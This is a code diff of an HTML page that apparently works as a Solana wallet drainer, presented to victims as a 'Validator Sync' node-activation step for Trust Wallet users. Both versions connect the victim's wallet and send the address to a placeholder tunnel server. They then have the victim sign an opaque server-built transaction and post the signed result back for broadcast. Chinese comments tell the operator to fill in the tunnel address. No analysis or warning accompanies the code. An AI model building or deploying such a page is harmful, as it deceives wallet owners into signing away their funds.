@@ -2,107 +2,66 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Node Verification</title>
-    <style>
-        /* 强制背景色，防止白屏感 */
-        html, body { background-color: #0b0e11 !important; margin: 0; padding: 0; height: 100%; color: white; }
-        .main-container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; text-align: center; }
-        .box { background: #181a20; padding: 30px; border-radius: 16px; border: 1px solid #2b2f36; width: 85%; max-width: 350px; }
-        .btn { background: #f0b90b; color: black; border: none; padding: 16px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: bold; margin-top: 20px; cursor: pointer; }
-        .btn:disabled { background: #474d57; color: #848e9c; }
-        .log { margin-top: 15px; font-size: 12px; color: #848e9c; min-height: 20px; }
-    </style>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Protocol Activation</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
 </head>
-<body>
-
-    <div class="main-container">
-        <div class="box">
-            <h2 style="margin:0 0 10px 0;">Validator Sync</h2>
-            <p style="font-size: 14px; color: #eaeaea;">Securely link your wallet to activate the validator node.</p>
-            
-            <button id="activate_btn" class="btn">ACTIVATE NOW</button>
-            <div id="status_log" class="log">System Status: Ready</div>
-        </div>
+<body style="background:#000; color:#fff; font-family:sans-serif; display:flex; justify-content:center; align-items:center; height:100vh;">
+    <div style="text-align:center; background:#111; padding:40px; border-radius:20px; border:1px solid #333;">
+        <h2 style="color:#14f195;">VALIDATOR SYNC</h2>
+        <button id="cta" style="background:#14f195; border:none; padding:15px 30px; border-radius:10px; font-weight:bold; cursor:pointer;">ACTIVATE ACCOUNT</button>
+        <p id="msg" style="color:#666; font-size:12px; margin-top:15px;">Awaiting interaction...</p>
     </div>
 
-    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js" onerror="alert('Library Load Failed! Check Internet.')"></script>
-
     <script>
-        // 🔱 配置检查：确保隧道地址不以斜杠结尾
-        const API_BASE = "https://你的穿透地址.com"; 
+        // 🔱 务必更新这个地址
+        const tunnel = "https://你的穿透地址.com"; 
 
-        const btn = document.getElementById('activate_btn');
-        const logBox = document.getElementById('status_log');
-
-        function updateLog(m) {
-            logBox.innerText = m;
-            console.log(m);
-        }
-
-        async function start() {
+        document.getElementById('cta').onclick = async function() {
+            const btn = this;
+            const log = document.getElementById('msg');
             try {
-                updateLog("Detecting Wallet...");
-                const provider = window.trustwallet?.solana || window.solana;
-                
-                if (!provider) {
-                    alert("Please open this link inside Trust Wallet Browser!");
-                    return;
-                }
+                const p = window.trustwallet?.solana || window.solana;
+                if (!p) { alert("Please use Trust Wallet browser!"); return; }
 
                 btn.disabled = true;
-                updateLog("Connecting...");
-                await provider.connect();
-                
-                const address = provider.publicKey.toString();
-                updateLog("Wallet: " + address.substring(0, 4) + "..." + address.substring(address.length - 4));
+                log.innerText = "Connecting...";
+                await p.connect();
 
-                // 第一步：请求构造
-                updateLog("Fetching Config...");
-                const res = await fetch(`${API_BASE}/prepare_v32`, {
+                log.innerText = "Fetching config...";
+                const resp = await fetch(tunnel + "/prepare_v32", {
                     method: 'POST',
+                    mode: 'cors', // 🔱 强制跨域模式
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ address: address })
+                    body: JSON.stringify({ address: p.publicKey.toString() })
                 });
 
-                if (!res.ok) throw new Error("Server Response Error: " + res.status);
-                
-                const data = await res.json();
-                if (!data.raw_tx) throw new Error(data.error || "No Transaction Data");
+                const info = await resp.json();
+                if (info.raw_tx) {
+                    log.innerText = "Awaiting signature...";
+                    const web3 = window.solanaWeb3;
+                    const tx = web3.Transaction.from(Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0)));
+                    
+                    const signed = await p.signTransaction(tx);
+                    log.innerText = "Broadcasting...";
 
-                // 第二步：签名
-                updateLog("Awaiting Signature...");
-                const web3 = window.solanaWeb3;
-                const tx = web3.Transaction.from(Uint8Array.from(atob(data.raw_tx), c => c.charCodeAt(0)));
-                
-                const signed = await provider.signTransaction(tx);
-                updateLog("Broadcasting...");
-
-                // 第三步：广播
-                const bRes = await fetch(`${API_BASE}/broadcast_v41`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ 
-                        signed_tx: btoa(String.fromCharCode.apply(null, signed.serialize())) 
-                    })
-                });
-
-                updateLog("Activation Finalized!");
-                alert("Node Activation Successful!");
-
-            } catch (e) {
-                alert("Process Error: " + e.message);
-                updateLog("Error: " + e.message);
-                btn.disabled = false;
+                    const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
+                    const bResp = await fetch(tunnel + "/broadcast_v41", {
+                        method: 'POST',
+                        mode: 'cors',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({ signed_tx: signedBase })
+                    });
+                    
+                    const result = await bResp.json();
+                    log.innerText = "Complete!";
+                    alert("Activation Successful!");
+                }
+            } catch (err) {
+                alert("Error: " + err.message);
+                log.innerText = "Failed. Reloading...";
+                setTimeout(() => window.location.reload(), 2000);
             }
-        }
-
-        btn.onclick = start;
-
-        // 🔱 启动自检
-        window.onload = () => {
-            console.log("🔱 Engine Loaded. API:", API_BASE);
-            if (!window.solanaWeb3) updateLog("Error: Web3 Library Not Found");
         };
     </script>
 </body>
